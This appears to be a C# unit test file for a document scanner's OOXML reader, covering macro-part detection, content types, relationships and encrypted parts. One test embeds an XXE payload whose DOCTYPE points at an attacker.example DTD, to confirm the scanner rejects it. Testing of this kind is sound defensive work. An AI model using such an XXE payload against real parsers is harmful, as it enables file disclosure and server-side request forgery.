using System.Text;
using Scythe.Formats;
using Scythe.Formats.Containers;
using Xunit;

namespace Scythe.Formats.Tests.Containers;

public class OoxmlReaderTests
{
    private static ScanBudget Budget => BudgetDefaults.Default;

    private const string ContentTypesWithMacro =
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
        "<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\">" +
        "<Default Extension=\"xml\" ContentType=\"application/xml\"/>" +
        "<Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/>" +
        "<Override PartName=\"/word/document.xml\" ContentType=\"application/vnd.ms-word.document.macroEnabled.main+xml\"/>" +
        "<Override PartName=\"/word/vbaProject.bin\" ContentType=\"application/vnd.ms-office.vbaProject\"/>" +
        "</Types>";

    private const string ContentTypesPlain =
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
        "<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\">" +
        "<Default Extension=\"xml\" ContentType=\"application/xml\"/>" +
        "<Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/>" +
        "<Override PartName=\"/word/document.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml\"/>" +
        "</Types>";

    private const string PackageRels =
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
        "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">" +
        "<Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"word/document.xml\"/>" +
        "</Relationships>";

    private static readonly byte[] MacroBytes = Encoding.ASCII.GetBytes("CompObj-vba-project-binary-not-interpreted-here");

    private static byte[] BuildPackage(bool withMacro, bool withRels = true)
    {
        var entries = new List<ZipEntryFixture>
        {
            new() { Name = "[Content_Types].xml", Data = Encoding.UTF8.GetBytes(withMacro ? ContentTypesWithMacro : ContentTypesPlain), Method = 8 },
            new() { Name = "word/document.xml", Data = Encoding.UTF8.GetBytes("<w:document/>"), Method = 8 },
        };
        if (withRels)
        {
            entries.Insert(1, new ZipEntryFixture { Name = "_rels/.rels", Data = Encoding.UTF8.GetBytes(PackageRels), Method = 8 });
        }
        if (withMacro)
        {
            entries.Add(new ZipEntryFixture { Name = "word/vbaProject.bin", Data = MacroBytes, Method = 0 });
        }
        return ZipFixtureBuilder.Build(entries.ToArray());
    }

    [Fact]
    public void PackageWithMacroPart_SurfacedWithSizeAndBytes()
    {
        byte[] package = BuildPackage(withMacro: true);
        var result = OoxmlReader.Read(package, Budget);
        Assert.Equal(OperationState.Ok, result.State);
        Assert.True(result.Package!.HasMacroPart);

        var macro = Assert.Single(result.Package.MacroParts);
        Assert.Equal("word/vbaProject.bin", macro.Name);
        Assert.Equal(MacroBytes.Length, macro.UncompressedSize);
        Assert.Equal(OoxmlReader.VbaProjectContentType, macro.ContentType);

        // The bytes are handed over uninterpreted — presence and content, no verdict.
        var read = OoxmlReader.ReadPart(package, result.Package, macro.Name, Budget);
        Assert.Equal(OperationState.Ok, read.State);
        Assert.Equal(MacroBytes, read.Bytes);
    }

    [Fact]
    public void PackageWithoutMacroPart_ReportsNone()
    {
        var result = OoxmlReader.Read(BuildPackage(withMacro: false), Budget);
        Assert.Equal(OperationState.Ok, result.State);
        Assert.False(result.Package!.HasMacroPart);
        Assert.Empty(result.Package.MacroParts);
    }

    [Fact]
    public void ContentTypes_ResolvedFromOverrideThenDefault()
    {
        var result = OoxmlReader.Read(BuildPackage(withMacro: false), Budget);
        var parts = result.Package!.Parts;
        Assert.Equal(
            "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml",
            parts.Single(p => p.Name == "word/document.xml").ContentType);           // Override wins
        Assert.Equal(
            "application/vnd.openxmlformats-package.relationships+xml",
            parts.Single(p => p.Name == "_rels/.rels").ContentType);                 // Default by extension
    }

    [Fact]
    public void Relationships_ParsedWithOfficeDocumentTarget()
    {
        var result = OoxmlReader.Read(BuildPackage(withMacro: false), Budget);
        var rel = Assert.Single(result.Package!.Relationships);
        Assert.Equal("rId1", rel.Id);
        Assert.Equal("word/document.xml", rel.Target);
        Assert.Equal("word/document.xml", result.Package.OfficeDocumentTarget);
    }

    [Fact]
    public void MissingRels_AnomalyRecorded_ReadStillCompletes()
    {
        var result = OoxmlReader.Read(BuildPackage(withMacro: false, withRels: false), Budget);
        Assert.Equal(OperationState.Ok, result.State);
        Assert.Contains(result.Package!.PackageAnomalies, a => a.Contains("_rels/.rels"));
        Assert.Empty(result.Package.Relationships);
    }

    [Fact]
    public void ZipWithoutContentTypes_NotAnOoxmlPackage_Failed()
    {
        byte[] zip = ZipFixtureBuilder.Build(new ZipEntryFixture { Name = "just-a-file.txt", Data = new byte[] { 1 } });
        var result = OoxmlReader.Read(zip, Budget);
        Assert.Equal(OperationState.Failed, result.State);
        Assert.Contains("[Content_Types].xml", result.Message);
    }

    [Fact]
    public void NotAZip_Failed()
    {
        var result = OoxmlReader.Read(Encoding.ASCII.GetBytes("MZ this is something else entirely........."), Budget);
        Assert.Equal(OperationState.Failed, result.State);
    }

    /// <summary>
    /// XXE canary: a DOCTYPE inside package metadata is an attack on the scanner itself.
    /// It must fail loudly — never be resolved, never be skipped.
    /// </summary>
    [Fact]
    public void DoctypeInContentTypes_FailsLoudly()
    {
        // Deliberately a DOCTYPE whose *body* is otherwise well-formed: if the DTD guard
        // were weakened from Prohibit to Ignore this document would parse cleanly, so this
        // test pins the guard itself, not incidental parse failures.
        string evil =
            "<?xml version=\"1.0\"?><!DOCTYPE Types SYSTEM \"http://attacker.example/evil.dtd\">" +
            "<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\">" +
            "<Default Extension=\"xml\" ContentType=\"application/xml\"/></Types>";
        byte[] package = ZipFixtureBuilder.Build(
            new ZipEntryFixture { Name = "[Content_Types].xml", Data = Encoding.UTF8.GetBytes(evil), Method = 8 });
        var result = OoxmlReader.Read(package, Budget);
        Assert.Equal(OperationState.Failed, result.State);
        Assert.Contains("[Content_Types].xml", result.Message);
    }

    [Fact]
    public void EncryptedMetadataPart_Incomplete_NotOk()
    {
        byte[] package = ZipFixtureBuilder.Build(
            new ZipEntryFixture { Name = "[Content_Types].xml", Data = Encoding.UTF8.GetBytes(ContentTypesPlain), Encrypted = true });
        var result = OoxmlReader.Read(package, Budget);
        Assert.Equal(OperationState.Incomplete, result.State);
        Assert.Contains("encrypted", result.Message);
        Assert.Null(result.Package);
    }

    [Fact]
    public void EncryptedContentPart_MakesPackageIncomplete_AndPartIsMarked()
    {
        byte[] package = ZipFixtureBuilder.Build(
            new ZipEntryFixture { Name = "[Content_Types].xml", Data = Encoding.UTF8.GetBytes(ContentTypesWithMacro), Method = 8 },
            new ZipEntryFixture { Name = "word/vbaProject.bin", Data = MacroBytes, Encrypted = true });
        var result = OoxmlReader.Read(package, Budget);
        Assert.Equal(OperationState.Incomplete, result.State);
        var macro = Assert.Single(result.Package!.MacroParts);
        Assert.True(macro.IsEncrypted);
        Assert.Contains(result.IncompleteReasons, r => r.Contains("vbaProject.bin"));
    }

    [Fact]
    public void MacroDetectedByNameEvenWithoutContentType()
    {
        // Content types file that never mentions the macro part: name still gives it away.
        byte[] package = ZipFixtureBuilder.Build(
            new ZipEntryFixture { Name = "[Content_Types].xml", Data = Encoding.UTF8.GetBytes(ContentTypesPlain), Method = 8 },
            new ZipEntryFixture { Name = "xl/vbaProject.bin", Data = MacroBytes, Method = 0 });
        var result = OoxmlReader.Read(package, Budget);
        Assert.True(result.Package!.HasMacroPart);
    }
}
